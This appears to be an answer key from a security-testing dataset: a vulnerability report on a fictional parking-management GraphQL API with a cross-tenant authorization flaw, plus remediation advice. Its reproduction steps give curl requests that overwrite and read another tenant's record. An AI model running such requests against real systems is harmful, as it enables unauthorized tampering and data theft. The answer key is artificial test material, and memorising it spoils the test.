# Expected Response

## System
- Domain: Parking / Smart Mobility
- System: ParkIQ Management API
- Example ID: GQL-0100

## Priority Findings

### Finding 1: Client-Assumed Authority — Parking Intersection Record Mutation Without Server-Side Ownership Validation (Pattern 3.1)
**Severity:** Critical
**Category:** Insecure Design / Client-Assumed Authority

**Summary:**
Per §5.0 (Pattern 3.1 — client-assumed authority): The server accepts the client-supplied intersection ID as authority without server-side ownership verification. An attacker from `tenant-76ca` submitted `updateIntersection(id: "I-2100", input: {status: "approved", ownerId: "attacker-76ca59c0"})` against a parking management intersection record belonging to `tenant-59c0`. The HAR response confirms the mutation succeeded, returning `getIntersection` data with cross-tenant ownership. Domain-specific objects are `Intersection`/`nodeId` (not generic `Resource`).

**Evidence from HAR:**
- Request: `POST https://api.parkiq-managemen.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-76ca`
- Mutation: `updateIntersection(id: "I-2100", input: {status: "approved", ownerId: "attacker-76ca59c0"}) { nodeId status }`
- Response `200 OK`; `getIntersection` returned: `tenantId: "tenant-59c0"`, `sensitiveField: "CONFIDENTIAL-76ca59c0"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-76ca59c0`

## Steps to Reproduce

### Step 1 — Cross-tenant intersection record mutation (HAR)
```bash
curl -s -X POST https://api.parkiq-managemen.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-76ca" \
  -d '{"query": "mutation { updateIntersection(id: \"I-2100\", input: {status: \"approved\", ownerId: \"attacker-76ca59c0\"}) { nodeId status } }"}'
```
**Vulnerable:** Victim intersection record mutated; `ownerId` poisoned. **Secure:** FORBIDDEN.

### Step 2 — Read cross-tenant intersection record
```bash
curl -s -X POST https://api.parkiq-managemen.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-76ca" \
  -d '{"query": "query { getIntersection(id: \"I-2100\") { nodeId tenantId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-59c0` intersection data exposed.

## Remediation
1. Server must verify ownership for all ID-based operations — never trust client-supplied IDs.
2. Resolver tenant guard on `updateIntersection`: `WHERE intersection_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `IntersectionInput`.
4. Redis cache key: `intersection:{tenantId}:{intersectionId}`.
